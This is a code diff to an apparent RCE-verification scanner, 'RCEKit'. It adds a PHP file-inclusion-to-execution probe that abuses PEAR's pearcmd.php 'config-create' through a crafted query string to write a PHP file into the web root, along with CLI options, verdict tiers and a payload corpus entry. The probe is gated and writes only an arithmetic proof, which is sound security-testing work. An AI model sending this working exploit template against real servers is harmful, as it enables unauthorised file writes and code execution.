@@ -46,7 +46,7 @@ def configure_logging() -> None:
 
 # Bump on every change: PATCH for fixes, MINOR for new capabilities, MAJOR for
 # breaking changes to the CLI, output formats, or template schema.
-__version__ = "3.11.0"
+__version__ = "3.12.0"
 
 SAFETY_ORDER = {"safe": 0, "intrusive": 1, "stateful": 2}
 
@@ -1070,6 +1070,7 @@ class RCEKit:
         self.argv_primitives: Dict[str, Dict[str, Any]] = {}
         self.include_wrappers: Dict[str, Dict[str, Any]] = {}
         self.include_read_targets: Dict[str, List[Dict[str, Any]]] = {}
+        self.include_exec_wrappers: Dict[str, Dict[str, Any]] = {}
         self._load_template_payloads()
 
         # Encoding and obfuscation techniques.
@@ -1153,6 +1154,7 @@ class RCEKit:
             self.argv_primitives = data.get("argv_primitives", {})
             self.include_wrappers = data.get("include_wrappers", {})
             self.include_read_targets = data.get("include_read_targets", {})
+            self.include_exec_wrappers = data.get("include_exec_wrappers", {})
         except Exception as exc:
             message = f"unable to parse {self.template_path}: {exc}"
             logger.error("%s", message)
@@ -1182,6 +1184,7 @@ class RCEKit:
             self.argv_primitives = data.get("argv_primitives", {})
             self.include_wrappers = data.get("include_wrappers", {})
             self.include_read_targets = data.get("include_read_targets", {})
+            self.include_exec_wrappers = data.get("include_exec_wrappers", {})
         except Exception as exc:  # pragma: no cover — a build-time guarantee
             message = f"unable to parse the built-in payload corpus: {exc}"
             logger.error("%s", message)
@@ -3838,7 +3841,7 @@ class RCEKit:
                             results.append({
                                 "verdict": verdict.status, "detail": verdict.evidence,
                                 "status": None, "payload": probe.payload,
-                                "method": meth.name, "tier": meth.tier,
+                                "method": meth.name, "tier": probe.tier or meth.tier,
                                 "environment": record.environment, "context": record.context,
                                 "category": "detection", "expected": probe.expected,
                             })
@@ -3862,7 +3865,7 @@ class RCEKit:
                     series_result = {
                         "verdict": verdict.status, "detail": verdict.evidence,
                         "status": None, "payload": probe.payload,
-                        "method": meth.name, "tier": meth.tier,
+                        "method": meth.name, "tier": probe.tier or meth.tier,
                         "environment": record.environment, "context": record.context,
                         "category": "detection", "expected": probe.expected,
                     }
@@ -3964,7 +3967,7 @@ class RCEKit:
                     result = {
                         "verdict": verdict.status, "detail": verdict.evidence,
                         "status": status, "payload": probe.payload,
-                        "method": meth.name, "tier": meth.tier,
+                        "method": meth.name, "tier": probe.tier or meth.tier,
                         "environment": record.environment, "context": record.context,
                         "category": "detection", "expected": probe.expected,
                     }
@@ -4191,8 +4194,12 @@ class RCEKit:
         # page that renders the file reported second-order EXECUTION with
         # nothing executed. Measured against a local target built to do exactly
         # that. The observed channel moves *where* the evidence appeared, never
-        # *what* it proves, so the tier travels with the method and a method
-        # added later inherits the right answer.
+        # *what* it proves, so the tier travels with the probe -- the shape's
+        # own tier where it declares one, the method's ceiling otherwise. Per
+        # shape rather than per method because `include` reaches `executed`
+        # through its write rung while its read rungs reach `file-read`, and
+        # carrying the ceiling here awarded execution to a second-order read.
+        # A method added later inherits the right answer either way.
         tier = result.get("tier") or EXECUTION_TIER
         result["verdict"] = tier
         result["observe_status"] = tier
@@ -4800,6 +4807,14 @@ class Probe:
     # than deleted for want of somewhere to declare it. Held back above the
     # run's tier.
     safety: Optional[str] = None
+    # The strongest tier THIS shape can reach, when it is below the method's.
+    # A method is not always one tier, for the same reason it is not always one
+    # rung: `include`'s read probes prove a file was read and its write probe
+    # proves the file was interpreted, and those are different findings. The
+    # observed channel is where it matters -- it awards the tier carried in the
+    # result, and carrying the method's ceiling there made a second-order file
+    # read report execution. Caught by the guard written when that was fixed.
+    tier: Optional[str] = None
     # A rung this shape reaches past, whose effect the run can undo by saying
     # it happened: a name resolved, a value computed, a delay waited out. The
     # probe goes out and the run reports it.
@@ -5943,14 +5958,33 @@ class FileInclude(DetectionMethod):
     cannot reproduce, which this project treats as worse than a missing
     feature, so it waits for the case rather than for the code."""
     name = "include"
-    tier = "file-read"
-    # Its own question, not `execution`. A run stops asking a question once it
-    # is answered, so leaving the default would skip this method on any target
-    # where execution was already proven -- discarding a finding with its own
-    # remediation, which is the mistake `lookup` declares a question to avoid.
+    tier = "executed"
+    # Below the ceiling, and both really happen: the read rungs report
+    # `file-read`, and the execution rung reports `file-write` for a file that
+    # was written and served back verbatim rather than interpreted -- the same
+    # distinction `write` draws, for the same reason and from the same evidence.
+    also_reports = ("file-read", "file-write")
+    # Its own question, and it stays that way now that the ceiling is
+    # `executed`. A run stops asking a question once it is answered, so
+    # `execution` here would skip this method on any target where execution was
+    # already proven -- discarding a file read with its own remediation. The
+    # tier says how strong an answer this can reach and the question says what
+    # it asks; `lookup` declares them separately for the same reason.
     question = "file-read"
+    # The rung the read probes need. The execution wrapper writes a file, so it
+    # declares `stateful` per shape through `Probe.safety` rather than holding
+    # the whole method there -- `lookup` splits its rungs the same way.
     safety = "safe"
+    # One request per read probe buys its own answer. The execution rung costs
+    # two, but it exists only once an operator names a write-back URL, which is
+    # itself the statement of intent -- so the default shape of this method is
+    # the cheap one and the wave ordering should treat it that way.
+    costly = False
 
+    # Bounded the way `write`'s are, for the reason that method measured:
+    # six-digit operands overflow a signed 32-bit int in some of the languages a
+    # written one-liner lands in, and a wrapped negative is not the product.
+    _OPERANDS = (1000, 9999)
     # Absolute first, then deepening. Eight is where a traversal from a web root
     # has long since reached `/` on every layout worth probing, and each rung
     # past the one that works costs a request and answers the same.
@@ -6057,12 +6091,88 @@ class FileInclude(DetectionMethod):
                         # echoes it back inside its own error, and that is
                         # reflection rather than a read.
                         forbidden=rendered,
+                        # A read proves a read, whatever this method's ceiling
+                        # is. Declared on the shape so the observed channel
+                        # cannot award it execution.
+                        tier="file-read",
                         carrier=f"{wrapper_name}/depth{depth}"))
+        probes.extend(self._exec_probes(record, rng))
+        return probes
+
+    def _exec_probes(self, record: "PayloadRecord",
+                     rng: "random.Random") -> List[Probe]:
+        """The rung that reaches execution, when the operator names where the
+        written file is served.
+
+        A wrapper carrying code -- ``data://``, ``php://input`` -- needs
+        ``allow_url_include``, which PHP has defaulted off since 5.2; the target
+        this was measured against said so itself. What works on a default build
+        is to make the sink include a script that *writes*, and hand that script
+        its arguments through the request. So this is a two-request proof like
+        ``file`` and ``write``: the write answers 200 whether or not anything was
+        interpreted, and the verdict comes from fetching the file back.
+
+        Gated on configuration rather than a rung, the way ``file`` and ``write``
+        are: with nowhere to read the file back from there is no proof to be
+        had, and naming a risk tier would answer a question nobody asked."""
+        template = str(self.config.get("include_write_url") or "")
+        declared: Dict[str, Any] = getattr(self.gen, "include_exec_wrappers", None) or {}
+        if not template or not declared:
+            return []
+        param = str(self.config.get("include_write_param") or "lang")
+        allowed = self.config.get("max_safety") or "safe"
+        probes: List[Probe] = []
+        for name, spec in declared.items():
+            body = str(spec.get("template", ""))
+            if not all(tok in body for tok in ("__EXPR__", "__NAME__", "__TRAVERSAL__")):
+                # Dropped unsent: a wrapper missing a substitution point cannot
+                # carry a computed value, and an unconfirmable probe still
+                # counts toward the coverage the run reports.
+                continue
+            declared_env = spec.get("sink_env") or "any"
+            if declared_env != "any" and declared_env != self._sink_env(record):
+                continue
+            rung = spec.get("safety") or "stateful"
+            if SAFETY_ORDER.get(rung, 2) > SAFETY_ORDER.get(allowed, 0):
+                continue
+            a, b = rng.randint(*self._OPERANDS), rng.randint(*self._OPERANDS)
+            expr = f"<?={a}*{b}?>"
+            leaf = "rk" + "".join(rng.choice(string.ascii_lowercase) for _ in range(10))
+            for depth in (self._DEPTHS if self._depth() == "full" else self._QUICK_DEPTHS):
+                if not depth:
+                    # The include needs a path it can actually reach, and an
+                    # absolute one is not what this wrapper builds: the climb is
+                    # the whole point of reaching PEAR's own directory.
+                    continue
+                rendered = (body.replace("__PARAM__", param)
+                                .replace("__TRAVERSAL__", "../" * depth)
+                                .replace("__EXPR__", expr)
+                                .replace("__NAME__", leaf))
+                probes.append(Probe(
+                    payload=rendered,
+                    expected=str(a * b),
+                    # The source form. Served back verbatim it means the file was
+                    # written and not interpreted, which is a different finding
+                    # and the one `write` calls `file-write`.
+                    forbidden=expr,
+                    boundary=True,
+                    safety=rung,
+                    tier=EXECUTION_TIER,
+                    # `file`'s renderer, so `{name}`, `{path}` and `{path_enc}`
+                    # mean the same thing in every read-back template an
+                    # operator writes.
+                    followup={"url": FileBased._render_read_url(
+                                  template, leaf + ".php", leaf + ".php"),
+                              "cleanup": f"remove the written file {leaf}.php from the web root",
+                              "path": leaf + ".php"},
+                    carrier=f"{name}/depth{depth}"))
         return probes
 
     def confirm(self, obs: "Observation", probe: "Probe") -> Verdict:
         if obs.status is None:
             return Verdict("error", f"request never reached the target ({obs.body[:120]})")
+        if probe.followup is not None:
+            return self._confirm_written(obs, probe)
         channel = self._search_channels(probe.expected,
                                         self._channels_of(obs.body, obs.channels))
         if channel is None:
@@ -6085,6 +6195,41 @@ class FileInclude(DetectionMethod):
                        f"target returned content of {probe.expected!r} from a path RCEKit "
                        f"named{f' in the {channel}' if channel else ''}, absent from the "
                        f"payload-free control{note} (arbitrary file read, NOT execution)")
+
+    def _confirm_written(self, obs: "Observation", probe: "Probe") -> Verdict:
+        """The execution rung's ladder, read from the file fetched back.
+
+        Three outcomes and they are different findings, which is why they are
+        three tiers rather than one. The product means the written file was
+        *interpreted*; the source coming back verbatim means it was written and
+        served and nothing evaluated it. The second is a real finding and not
+        execution, and `write` has called it `file-write` since 2.31.0."""
+        if obs.followup_body is None:
+            return Verdict("error",
+                           "the write request answered but the written file could not be "
+                           "fetched (wrong --include-write-url, or nothing was written)")
+        if self._search(probe.expected, obs.followup_body, boundary=True):
+            if self._search_channels(probe.expected,
+                                     self._channels_of(obs.control_body,
+                                                       obs.control_channels),
+                                     boundary=True):
+                return Verdict("inconclusive",
+                               f"the product {probe.expected!r} is in the payload-free "
+                               "control too, so the fetched file does not show it was "
+                               "interpreted")
+            return Verdict("executed",
+                           f"target wrote a file through the inclusion sink and then "
+                           f"EXECUTED it: the fetched file carries {probe.expected!r}, a "
+                           "product of operands random to this probe, and the source form "
+                           "is not there (execution + write primitive)")
+        if probe.forbidden and self._search(probe.forbidden, obs.followup_body):
+            return Verdict("file-write",
+                           f"target wrote {(probe.followup or {}).get('path', 'a file')!r} through the inclusion sink and "
+                           "serves it back VERBATIM, so the path is reachable and writable "
+                           "but nothing interpreted it. A real finding, and not RCE")
+        return Verdict("negative",
+                       "the written file carries neither the product nor the source, so "
+                       "nothing was written where it was read back from")
 
 
 class WriteThenExecute(DetectionMethod):
@@ -10683,6 +10828,26 @@ def main(argv: Optional[List[str]] = None) -> int:
                              "Off by default because a bridge payload is SQL or XML syntax: on an "
                              "ordinary shell sink it is a request that cannot confirm. A stateful "
                              "bridge also needs --verify-active-risk stateful.")
+    parser.add_argument("--include-write-url", default=None, metavar="URL",
+                        help="(--methods include) Where a file written THROUGH the "
+                             "inclusion sink is served, with {name} for the filename "
+                             "RCEKit chose -- the same template convention as "
+                             "--file-read-url. Without it `include` proves reads only: a "
+                             "wrapper carrying code needs allow_url_include, which PHP has "
+                             "defaulted off since 5.2, so the route that works on a default "
+                             "build writes a file and reads it back, and there is no proof "
+                             "to be had until you say where it lands. The write needs "
+                             "--verify-active-risk stateful, and every finding prints its "
+                             "own cleanup line.")
+    parser.add_argument("--include-write-param", default=None, metavar="NAME",
+                        help="(--methods include with --include-write-url) The request "
+                             "parameter the inclusion sink reads its path from, default "
+                             "`lang`. The execution wrapper is the WHOLE query string, "
+                             "because the script it includes takes its arguments from there, "
+                             "so RCEKit has to write that parameter's name into the payload "
+                             "rather than inject into its value -- which also means the "
+                             "payload needs --verify-url-location raw to reach the wire "
+                             "intact.")
     parser.add_argument("--include-wrappers", default=None, metavar="NAMES",
                         help="(--methods include) Which inclusion wrappers to send: auto "
                              "(default, the whole corpus 'include_wrappers' section) or a "
@@ -11325,6 +11490,10 @@ def main(argv: Optional[List[str]] = None) -> int:
                                 "bridges": bridges,
                                 "argv_binaries": argv_binaries,
                                 "include_wrappers": include_wrappers,
+                                "include_write_url": from_profile(
+                                    args.include_write_url, "include_write_url"),
+                                "include_write_param": from_profile(
+                                    args.include_write_param, "include_write_param"),
                                 "deser_formats": deser_formats,
                                 # The bridges honour the same safety ordering as
                                 # every corpus payload, so a stateful bridge is
@@ -12849,6 +13018,21 @@ EMBEDDED_PAYLOAD_CORPUS = r"""
       "requires": ["a PHP stream-wrapper-aware sink (include, file_get_contents, readfile)"],
       "notes": "Reads through a PHP filter, which base64-encodes the content on the way out. It needs no extra oracle: RCEKit's evidence search already peels base64 runs of 16 characters or more, and a file's worth of base64 is far past that, so the same content signature is found inside the encoded blob. It is worth sending beside `plain` because it proves more about the sink -- a stream wrapper was honoured, which `file_get_contents` of a plain path does not show -- and because it reads a file that a bare include would have *executed* instead of printing. Nothing here needs allow_url_include: the resource is local and the filter is not a URL wrapper.",
       "verified": "vulhub php/inclusion, 2026-10-31: resource=/proc/version returned a 196-character base64 run decoding to the file's content"
+    }
+  },
+  "include_exec_wrappers": {
+    "php_pearcmd_config_create": {
+      "sink_env": "any",
+      "safety": "stateful",
+      "template": "+config-create+/&__PARAM__=__TRAVERSAL__usr/local/lib/php/pearcmd&/__EXPR__+__NAME__.php",
+      "writes": true,
+      "requires": [
+        "PHP with register_argc_argv on, which turns the query string into argv for the included script",
+        "the PEAR package present at /usr/local/lib/php/pearcmd.php, which the official php docker images ship",
+        "the written file served back by the web server, which is what the proof is read from"
+      ],
+      "notes": "The route from an inclusion sink to execution on a build that has allow_url_include off, which is every default since PHP 5.2. It does not carry code through a wrapper; it makes the sink include PEAR's own command-line script and hands that script arguments through the query string, and `config-create` writes its output to a path the arguments name. The code goes in the output. Two things about the shape were measured rather than reasoned. First, the payload is the WHOLE query string and not one parameter's value: register_argc_argv builds argv from the query string, so `config-create` and its target filename have to sit outside the parameter that carries the traversal, which is why this wrapper substitutes the parameter name itself and why it needs --verify-url-location raw to reach the wire intact. Second, it is a two-request proof like `file` and `write`: the first request writes and answers 200 whether or not anything was interpreted, so the verdict comes from fetching the written file, and the computed product distinguishes a file that was interpreted from one served verbatim.",
+      "verified": "vulhub thinkphp/lang-rce (vulhub/thinkphp:6.0.12), 2026-10-31: the whole-query-string form wrote rkone.php and the fetch returned 204020 for 404*505 with the literal absent, so the written file was interpreted"
     }
   },
   "include_read_targets": {
